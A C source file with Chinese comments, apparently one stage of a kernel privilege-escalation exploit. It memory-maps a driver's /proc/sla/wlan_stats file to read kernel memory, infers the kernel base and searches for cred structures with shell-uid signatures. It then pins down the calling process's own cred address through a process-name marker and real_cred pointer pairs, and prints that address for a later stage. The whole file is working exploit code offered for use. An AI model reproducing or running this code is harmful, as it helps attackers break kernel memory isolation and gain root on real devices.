/* credfind2.c — credfind 的第二版: 不假设任何 task_struct 内部偏移, 只用"签名 + 谁指向它"。
 * 设计理由见 analysis/GHOST-CRED-SWEEP-20260928.md(`stats_map` 不看 vm_pgoff ⇒ 窗口起点固定)。 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <setjmp.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/stat.h>

static sigjmp_buf jb;
static volatile int on;
static void sbb(int s) { (void)s; if (on) siglongjmp(jb, 1); }
static uint64_t q(const unsigned char *p, size_t o) { uint64_t v; memcpy(&v, p + o, 8); return v; }
static int cmp64(const void *a, const void *b) {
  uint64_t x = *(const uint64_t *)a, y = *(const uint64_t *)b;
  return x < y ? -1 : (x > y ? 1 : 0);
}
static uint64_t find_base(const unsigned char *m, const unsigned char *ok, size_t np, size_t *cnt_out) {
  size_t cap = 4u << 20, n = 0;
  uint64_t *kv = malloc(cap * sizeof *kv);
  if (!kv) return 0;
  for (size_t i = 0; i < np; i++) {
    if (!ok[i]) continue;
    for (size_t o = i * 4096u; o + 8 <= (i + 1) * 4096u; o += 8) {
      uint64_t v = q(m, o);
      if ((v >> 48) != 0xffffULL || v <= o) continue;
      if (n < cap) kv[n++] = (v - o) & ~0xfffULL;
    }
  }
  qsort(kv, n, sizeof *kv, cmp64);
  uint64_t best = 0; size_t bestn = 0, run = 1;
  for (size_t i = 1; i <= n; i++) {
    if (i < n && kv[i] == kv[i - 1]) run++;
    else { if (run > bestn) { bestn = run; best = kv[i - 1]; } run = 1; }
  }
  free(kv);
  if (cnt_out) *cnt_out = bestn;
  return best;
}

#define MAXC 8192
static size_t cred_of[MAXC];
static uint64_t cred_va[MAXC];
static int ncred;

int main(int argc, char **argv) {
  const char *path = "/proc/sla/wlan_stats";
  const char *mark = argc > 1 ? argv[1] : "GH0STMARK12345";
  size_t want = argc > 2 ? (size_t)strtoull(argv[2], NULL, 0) : (2ull << 30);
  uid_t me = getuid(), mg = getgid();
  char nm[16];
  snprintf(nm, sizeof nm, "%.15s", mark);
  if (prctl(PR_SET_NAME, nm, 0, 0, 0)) printf("[-] prctl(PR_SET_NAME) errno=%d\n", errno);
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) { printf("open %s 失败 errno=%d(%s)\n", path, errno, strerror(errno)); return 1; }
  size_t L = 0;
  unsigned char *m = MAP_FAILED;
  for (size_t s = want; s >= (16u << 20); s >>= 1) {
    m = mmap(NULL, s, PROT_READ, MAP_SHARED, fd, 0);
    if (m != MAP_FAILED) { L = s; break; }
  }
  if (m == MAP_FAILED) { printf("mmap 全失败 errno=%d(%s)\n", errno, strerror(errno)); return 2; }
  printf("[CF] %s: 窗口 len=%zu MB(offset 参数无效 ⇒ 起点恒为 __pa(private_data))\n", path, L >> 20);
  struct sigaction sa, old;
  memset(&sa, 0, sizeof sa); sa.sa_handler = sbb; sigemptyset(&sa.sa_mask);
  sigaction(SIGBUS, &sa, &old);
  size_t np = L / 4096u, okp = 0, last_ok = 0;
  unsigned char *ok = calloc(np, 1);
  for (size_t i = 0; i < np; i++) {
    on = 1;
    if (sigsetjmp(jb, 1) == 0) { volatile char c = m[i * 4096u]; (void)c; ok[i] = 1; okp++; last_ok = i; }
    on = 0;
  }
  printf("[CF] 可读页 %zu/%zu(最后一个在 +%zu MB)\n", okp, np, (last_ok * 4096u) >> 20);
  size_t bcnt = 0;
  uint64_t K = find_base(m, ok, np, &bcnt);
  printf("[CF] 基址 K=%016llx(页对齐分桶自洽 %zu 槽)\n", (unsigned long long)K, bcnt);
  if (!K) return 3;

  /* (1) 全窗口搜 cred 的 id 签名: cred+4 起连续 4 个 qword 都是 0x07d007d007d007d0。
   *     ★ cred 是 8 对齐 ⇒ cred+4 是 **4 mod 8**, 所以必须**按 4 字节步进**扫,
   *       按 8 步进会一个都找不到(9/28 就因此白跑了一次)。 */
  const uint64_t SIG = 0x07d007d007d007d0ULL;
  size_t nsig = 0;
  for (size_t i = 0; i < np; i++) {
    if (!ok[i]) continue;
    for (size_t o = i * 4096u; o + 36 <= (i + 1) * 4096u && o + 36 <= L; o += 4) {
      if (q(m, o) != SIG || q(m, o + 8) != SIG || q(m, o + 16) != SIG || q(m, o + 24) != SIG) continue;
      nsig++;
      if (ncred < MAXC) { cred_of[ncred] = o - 4; cred_va[ncred] = K + (o - 4); ncred++; }
      o += 28;
    }
  }
  printf("[CF] (1) cred id 签名 %zu 处(记前 %d 个)%s\n", nsig, ncred,
         ncred ? "" : " ⇒ 窗口里根本没有 shell 的 cred(K 错了或都在窗口外)");
  for (int i = 0; i < ncred && i < 6; i++)
    printf("[CF]     cred#%d off=+0x%zx VA=%016llx\n", i, cred_of[i], (unsigned long long)cred_va[i]);

  /* (2) 每轮随机的 comm 标记落在哪 */
  size_t ml = strlen(nm);
  size_t comm[32]; int nc = 0;
  for (size_t o = 0; o + ml + 1 <= L && nc < 32; o++) {
    size_t pg = o / 4096u;
    if (!ok[pg]) { o = (pg + 1) * 4096u; continue; }
    if (m[o] != nm[0] || memcmp(m + o, nm, ml)) continue;
    comm[nc++] = o;
    printf("[CF] (2) comm 标记 #%d @ +%zu (VA %016llx)\n", nc, o, (unsigned long long)(K + o));
  }
  if (!nc) { printf("[CF] × 窗口里没有 comm 标记 ⇒ 我们的 task_struct 不在窗口内\n"); return 4; }

  /* (3) 一遍扫全部槽: 值正好等于某个 cred 的 VA ⇒ 那是指向 cred 的指针;
   *     再要求前一格相等(real_cred 紧邻)且与 comm 标记相差 ≤ 0x2000(同一个 task 体)。 */
  uint64_t *sv = malloc((size_t)(ncred + 1) * sizeof *sv);
  for (int i = 0; i < ncred; i++) sv[i] = cred_va[i];
  qsort(sv, ncred, sizeof *sv, cmp64);
  int found = 0;
  for (size_t i = 0; i < np && !found; i++) {
    if (!ok[i]) continue;
    for (size_t o = i * 4096u; o + 8 <= (i + 1) * 4096u; o += 8) {
      uint64_t V = q(m, o);
      if ((V >> 48) != 0xffffULL) continue;
      if (!bsearch(&V, sv, ncred, sizeof *sv, cmp64)) continue;
      int idx = -1;
      for (int c = 0; c < ncred; c++) if (cred_va[c] == V) { idx = c; break; }
      int is_pair = (o >= 8 && q(m, o - 8) == V);
      int near_comm = 0;
      for (int c = 0; c < nc; c++)
        if ((o > comm[c] ? o - comm[c] : comm[c] - o) <= 0x2000) near_comm = 1;
      printf("[CF] (3) 指针槽 +%zu (VA %016llx) ⇒ cred#%d  real前一格相等=%s  与标记同任务体=%s\n",
             o, (unsigned long long)V, idx, is_pair ? "Y" : "n", near_comm ? "Y" : "n");
      if (is_pair && near_comm) {
        printf("[CF] *** 三步全过 => 我们自己的 cred = %016llx (task 基址约 +%zu)\n",
               (unsigned long long)V, o - 0x848);
        printf("CRED=%llx\n", (unsigned long long)V);
        found = 1;
      }
    }
  }
  if (!found) printf("[CF] x 没有同时满足(real_cred 相等 + 与 comm 标记同任务体)的 cred\n");
  free(sv);
  munmap(m, L);
  close(fd);
  return found ? 0 : 5;
}
